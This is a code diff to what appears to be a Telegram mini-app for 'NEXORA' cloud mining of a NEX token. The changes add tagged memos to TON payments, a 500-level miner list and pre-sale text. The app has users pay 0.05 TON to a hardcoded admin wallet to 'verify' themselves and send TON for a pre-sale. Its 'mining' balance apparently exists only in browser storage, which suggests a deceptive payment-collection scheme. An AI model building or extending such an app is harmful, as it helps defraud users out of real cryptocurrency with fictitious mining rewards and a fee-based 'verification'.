@@ -126,8 +126,18 @@
     .form-label { font-size: 11px; color: var(--text-sub); display: block; margin-bottom: 4px; }
     .form-input { width: 100%; background: #080d16; border: 1px solid var(--card-border); border-radius: 10px; padding: 12px; color: #fff; font-size: 13px; outline: none; }
 
-    /* ATF Miners Grid */
-    .miners-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+    /* ATF Miners Grid (Infinite Scroll 1 - 500) */
+    .miners-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      max-height: 72vh;
+      overflow-y: auto;
+      padding-right: 4px;
+      padding-bottom: 20px;
+    }
+    .miners-grid::-webkit-scrollbar { width: 4px; }
+    .miners-grid::-webkit-scrollbar-thumb { background: #1a2536; border-radius: 4px; }
     .miner-card { background: #0d131f; border: 1px solid var(--card-border); border-radius: 16px; padding: 14px; text-align: center; position: relative; }
     .miner-card.active { border-color: var(--accent-green); box-shadow: 0 0 15px rgba(0, 230, 118, 0.15); }
     .btn-miner { width: 100%; padding: 8px; border-radius: 10px; border: none; font-size: 11px; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #182234; color: var(--accent-gold); }
@@ -189,7 +199,7 @@
         <div class="circle-label">Cloud Mining</div>
         <div class="circle-amount" id="mined-balance">0.0000</div>
         <div class="circle-speed" id="live-speed-txt">8.50 NEX / hr</div>
-        <div style="font-size: 10px; color: var(--text-sub); margin-top: 4px;" id="hold-status-txt">Hold TON to boost up to Lvl 500</div>
+        <div style="font-size: 10px; color: var(--text-sub); margin-top: 4px;" id="hold-status-txt">Hold TON/GRAM to reach Lvl 500</div>
       </div>
     </div>
 
@@ -205,7 +215,7 @@
         <span style="font-size: 11px; color: var(--accent-cyan); font-weight: 700;">Stage 1 Pre-Sale</span>
       </div>
       <p style="font-size: 12px; color: var(--text-sub); margin: 6px 0 10px;">
-        Exchange TON to secure allocations before January 1, 2027 listing.
+        Exchange TON/GRAM to secure allocations before January 1, 2027 listing.
       </p>
 
       <div class="preorder-grid">
@@ -242,19 +252,18 @@
     </div>
   </div>
 
-  <!-- TAB 2: MINERS (DYNAMIC PROGRESSION UP TO LEVEL 500) -->
+  <!-- TAB 2: MINERS (LEVEL 1 TO 500 FULL LIST) -->
   <div id="tab-miners" class="tab-content">
     <div style="display: flex; justify-content: space-between; align-items: baseline;">
       <div style="font-size: 15px; font-weight: 800;">Node Rigs & Levels</div>
       <div style="font-size: 12px; color: var(--accent-gold); font-weight: 800;" id="user-holding-txt">Holding: 0 TON</div>
     </div>
     <div style="font-size: 12px; color: var(--text-sub); margin-bottom: 12px;">
-      Levels scale up to <b>Level 500</b> automatically based on TON held in your connected wallet.
+      Levels 1 to 500 scale automatically based on TON/GRAM held in your wallet.
     </div>
 
-    <div class="miners-grid" id="miners-list-container">
-      <!-- Dynamic Level Cards Rendered Here -->
-    </div>
+    <!-- Infinite Scroll List from Level 1 to 500 -->
+    <div class="miners-grid" id="miners-list-container"></div>
   </div>
 
   <!-- TAB 3: TASKS -->
@@ -336,7 +345,7 @@
     document.getElementById('user-display-name').innerText = '@' + (tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name);
   }
 
-  // TON Address Checksum Converter (SDK Validation Error အား လုံးဝရှင်းလင်းပေးသည်)
+  // TON Standard Bounceable Address Converter
   function toBounceableAddress(addrStr) {
     try {
       let b64 = addrStr.replace(/-/g, '+').replace(/_/g, '/');
@@ -344,9 +353,7 @@
       const binary = atob(b64);
       const bytes = new Uint8Array(binary.length);
       for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      bytes[0] = 0x11; // Standard bounceable flag
-      
+      bytes[0] = 0x11;
       let crc = 0;
       for (let i = 0; i < 34; i++) {
         crc ^= (bytes[i] << 8);
@@ -357,7 +364,6 @@
       }
       bytes[34] = (crc >> 8) & 0xff;
       bytes[35] = crc & 0xff;
-      
       let res = "";
       for (let i = 0; i < bytes.length; i++) res += String.fromCharCode(bytes[i]);
       return btoa(res).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
@@ -366,11 +372,20 @@
     }
   }
 
-  // သင့် Wallet Address အား Valid Bounceable Format သို့ ပြောင်းလဲခြင်း
+  // Helper to build standard text memo payload for Tonkeeper
+  function buildTextCommentPayload(commentText) {
+    const bytes = new TextEncoder().encode(commentText);
+    const full = new Uint8Array(4 + bytes.length);
+    full.set(bytes, 4); // First 4 bytes are 0x00000000 for simple comment opcode
+    let binary = "";
+    for (let i = 0; i < full.length; i++) binary += String.fromCharCode(full[i]);
+    return btoa(binary);
+  }
+
   const ADMIN_WALLET = toBounceableAddress("UQDUUWNDj91KKR4Ia0eyazhxSVsdREn4AExTiqx2ArFOAdg4");
   let isWalletVerified = localStorage.getItem('nex_wallet_verified') === 'true';
 
-  // 1. Level System up to Level 500 (Holding TON in Wallet)
+  // 1. Level System (Level 1 to 500 Full List)
   let userLevel = 1;
   let tonHoldAmount = 0.0;
   let miningSpeed = 8.50;
@@ -379,10 +394,8 @@
     const container = document.getElementById('miners-list-container');
     container.innerHTML = "";
 
-    // Show current level and upcoming level tiers up to 500
-    const levelsToShow = [userLevel, userLevel + 1, userLevel + 2, userLevel + 5, userLevel + 20, 500].filter((v, i, a) => a.indexOf(v) === i && v <= 500);
-
-    levelsToShow.forEach(lvl => {
+    // Generate cards from Level 1 to 500
+    for (let lvl = 1; lvl <= 500; lvl++) {
       const isCurrent = lvl === userLevel;
       const speed = (8.50 + (lvl - 1) * 0.15).toFixed(2);
       const requiredTon = ((lvl - 1) * 0.02).toFixed(2);
@@ -391,17 +404,17 @@
       card.className = `miner-card ${isCurrent ? 'active' : ''}`;
       card.innerHTML = `
         <div style="font-size: 11px; color: ${isCurrent ? 'var(--accent-green)' : 'var(--text-sub)'}; font-weight: 800;">Lvl ${lvl}</div>
-        <div style="font-size: 28px; margin: 6px 0;">${isCurrent ? '⚡' : (lvl === 500 ? '👑' : '📦')}</div>
-        <div style="font-size: 16px; font-weight: 800; color: ${isCurrent ? 'var(--accent-green)' : 'var(--accent-gold)'};">
+        <div style="font-size: 26px; margin: 4px 0;">${isCurrent ? '⚡' : (lvl % 50 === 0 ? '👑' : '📦')}</div>
+        <div style="font-size: 15px; font-weight: 800; color: ${isCurrent ? 'var(--accent-green)' : 'var(--accent-gold)'};">
           ${isCurrent ? 'ACTIVE' : `Hold ${requiredTon} TON`}
         </div>
-        <div style="font-size: 11px; color: var(--text-sub); margin: 4px 0 8px;">Speed ${speed} NEX/h</div>
+        <div style="font-size: 10px; color: var(--text-sub); margin: 3px 0 6px;">Speed ${speed} NEX/h</div>
         <button class="btn-miner ${isCurrent ? 'active' : ''}">
           ${isCurrent ? 'MINING ACTIVE' : `🔒 NEED LVL ${lvl}`}
         </button>
       `;
       container.appendChild(card);
-    });
+    }
   }
 
   async function checkWalletHolding(rawAddress) {
@@ -411,8 +424,8 @@
         const data = await res.json();
         const nano = data.balance || 0;
         tonHoldAmount = parseFloat((nano / 1000000000).toFixed(4));
-        
-        // Every 0.02 TON held = +1 Level (Max Level 500)
+
+        // Every 0.02 TON held = +1 Level (Max 500)
         userLevel = Math.min(500, Math.max(1, Math.floor(tonHoldAmount / 0.02) + 1));
         miningSpeed = 8.50 + (userLevel - 1) * 0.15;
 
@@ -459,7 +472,7 @@
     updateWalletVerifyUI();
   });
 
-  // 2. Verify Wallet Function
+  // 2. Verify Wallet Function with MEMO
   async function triggerWalletVerification() {
     if (!tonConnectUI.connected) {
       alert("Please connect your wallet first!");
@@ -468,9 +481,16 @@
     }
     if (isWalletVerified) return;
 
+    const verifyMemo = `NEXORA_VERIFY:TG_${telegramUserId}`;
     const transaction = {
       validUntil: Math.floor(Date.now() / 1000) + 300,
-      messages: [{ address: ADMIN_WALLET, amount: "50000000" }]
+      messages: [
+        {
+          address: ADMIN_WALLET,
+          amount: "50000000", // 0.05 TON
+          payload: buildTextCommentPayload(verifyMemo)
+        }
+      ]
     };
 
     try {
@@ -487,7 +507,7 @@
     }
   }
 
-  // 3. Preorder Logic
+  // 3. Preorder Logic with MEMO (Token & Amount Tagged)
   let selectedTon = 0.1;
   let selectedNex = 1000;
 
@@ -519,10 +539,17 @@
       return;
     }
 
+    const preorderMemo = `NEXORA_PREORDER:${selectedNex}_NEX:TG_${telegramUserId}`;
     const nanoAmount = Math.floor(selectedTon * 1000000000).toString();
     const transaction = {
       validUntil: Math.floor(Date.now() / 1000) + 300,
-      messages: [{ address: ADMIN_WALLET, amount: nanoAmount }]
+      messages: [
+        {
+          address: ADMIN_WALLET,
+          amount: nanoAmount,
+          payload: buildTextCommentPayload(preorderMemo)
+        }
+      ]
     };
 
     try {
@@ -536,7 +563,7 @@
     }
   }
 
-  // 4. Anytime Mining Loop
+  // 4. Mining Loop
   let totalBalance = parseFloat(localStorage.getItem('nex_bal')) || 0.0;
   let miningStart = parseInt(localStorage.getItem('nex_start')) || Date.now();
   localStorage.setItem('nex_start', miningStart);
